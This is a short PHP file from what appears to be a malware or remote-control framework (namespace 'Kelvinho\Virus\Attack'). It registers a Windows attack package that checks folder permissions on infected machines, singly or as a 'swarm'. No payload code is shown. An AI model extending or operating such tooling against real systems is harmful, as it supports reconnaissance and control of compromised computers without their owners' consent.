<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.CheckPermission", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CheckPermission\\CheckPermission", "adv.CheckPermission", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Check permission of a bunch of folders");